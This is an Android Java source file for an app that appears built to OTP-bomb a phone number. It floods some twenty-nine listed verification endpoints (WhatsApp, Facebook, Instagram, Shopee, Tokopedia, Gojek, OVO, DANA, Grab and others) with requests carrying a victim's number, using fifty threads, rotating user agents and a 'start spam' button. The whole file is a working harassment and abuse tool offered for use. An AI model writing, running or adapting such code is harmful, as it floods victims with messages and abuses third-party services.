package com.com.spamer;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class MainActivity extends Activity {
    private TextView logTextView;
    private EditText nomorInput, jumlahInput;
    private Button startButton;
    private StringBuilder logBuilder = new StringBuilder();

    // ============ 25+ URL ASLI DARI SNIFFING ============
    private static final String[] URLS = {
        "https://web.whatsapp.com/otp/request",
        "https://v.whatsapp.net/v2/register",
        "https://g.whatsapp.net/register",
        "https://api.whatsapp.com/sendotp",
        "https://www.whatsapp.com/otp/request",
        "https://web.whatsapp.com/otp/send",
        "https://api.whatsapp.com/otp/send",
        "https://v.whatsapp.net/v2/code/request",
        "https://g.whatsapp.net/v2/code/request",
        "https://www.whatsapp.com/otp/send",
        "https://www.facebook.com/login/identify/",
        "https://m.facebook.com/login/identify/",
        "https://api.facebook.com/method/auth.sendSms",
        "https://www.instagram.com/accounts/send_verification_code/",
        "https://i.instagram.com/api/v1/accounts/send_verification_code/",
        "https://api.shopee.co.id/api/v1/otp/send",
        "https://shopee.co.id/api/v1/otp/send",
        "https://api.tokopedia.com/otp/request",
        "https://www.tokopedia.com/otp/request",
        "https://api.gojekapi.com/v1/customers/otp",
        "https://api.gojek.co.id/v1/customers/otp",
        "https://api.ovo.id/otp/request",
        "https://www.ovo.id/otp/request",
        "https://api.dana.id/v1/otp/send",
        "https://www.dana.id/v1/otp/send",
        "https://api.linkaja.com/v1/otp/send",
        "https://www.linkaja.com/v1/otp/send",
        "https://api.grab.com/v1/otp/send",
        "https://www.grab.com/id/otp/send"
    };

    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
        "WhatsApp/2.22.10.73",
        "Facebook/4.1.2",
        "Instagram/1.0"
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // BUAT LAYOUT
        ScrollView scroll = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);

        nomorInput = new EditText(this);
        nomorInput.setHint("📱 Nomor (62xxx)");
        layout.addView(nomorInput);

        jumlahInput = new EditText(this);
        jumlahInput.setHint("🔁 Jumlah spam (misal 100)");
        jumlahInput.setText("100");
        layout.addView(jumlahInput);

        startButton = new Button(this);
        startButton.setText("🚀 MULAI SPAM");
        startButton.setOnClickListener(v -> mulaiSpam());
        layout.addView(startButton);

        logTextView = new TextView(this);
        logTextView.setText("Menunggu perintah tuan...\n");
        logTextView.setTextSize(12);
        layout.addView(logTextView);

        scroll.addView(layout);
        setContentView(scroll);
    }

    private void mulaiSpam() {
        String nomor = nomorInput.getText().toString().trim();
        int jumlah;
        try {
            jumlah = Integer.parseInt(jumlahInput.getText().toString().trim());
        } catch (Exception e) {
            log("❌ Jumlah harus angka!");
            return;
        }
        if (nomor.isEmpty() || nomor.length() < 10) {
            log("❌ Nomor tidak valid! Format 62xxx");
            return;
        }
        startButton.setEnabled(false);
        log("🔥 Memulai spam ke " + nomor + " sebanyak " + jumlah + " kali...");
        new SpamTask().execute(nomor, jumlah);
    }

    private void log(String msg) {
        runOnUiThread(() -> {
            logBuilder.append(msg).append("\n");
            logTextView.setText(logBuilder.toString());
        });
    }

    private class SpamTask extends AsyncTask<Object, String, Void> {
        @Override
        protected Void doInBackground(Object... params) {
            String nomor = (String) params[0];
            int jumlah = (int) params[1];
            Random rand = new Random();
            ExecutorService executor = Executors.newFixedThreadPool(50);
            int[] counter = {0};
            Object lock = new Object();

            for (int i = 0; i < jumlah; i++) {
                executor.submit(() -> {
                    try {
                        kirimSpam(nomor, rand);
                        synchronized (lock) {
                            counter[0]++;
                            publishProgress("✅ [" + counter[0] + "] Request terkirim");
                        }
                    } catch (Exception e) {
                        synchronized (lock) {
                            counter[0]++;
                            publishProgress("❌ [" + counter[0] + "] Error: " + e.getMessage());
                        }
                    }
                });
                try { Thread.sleep(100); } catch (InterruptedException e) {}
            }

            executor.shutdown();
            try { executor.awaitTermination(5, TimeUnit.MINUTES); } catch (InterruptedException e) {}
            publishProgress("✅ Selesai! Total request: " + counter[0]);
            return null;
        }

        @Override
        protected void onProgressUpdate(String... values) {
            log(values[0]);
        }

        @Override
        protected void onPostExecute(Void v) {
            startButton.setEnabled(true);
        }

        private void kirimSpam(String nomor, Random rand) throws Exception {
            String ua = USER_AGENTS[rand.nextInt(USER_AGENTS.length)];
            for (String baseUrl : URLS) {
                try {
                    String targetUrl = baseUrl;
                    if (targetUrl.contains("?"))
                        targetUrl += "&phone=" + nomor + "&country_code=62";
                    else
                        targetUrl += "?phone=" + nomor + "&country_code=62";

                    HttpURLConnection conn = (HttpURLConnection) new URL(targetUrl).openConnection();
                    conn.setRequestMethod("GET");
                    conn.setRequestProperty("User-Agent", ua);
                    conn.setConnectTimeout(3000);
                    conn.setReadTimeout(3000);
                    conn.getResponseCode(); // biar request terkirim
                    conn.disconnect();
                } catch (Exception e) {
                    // ignore biar tetap lanjut
                }
            }
        }
    }
}
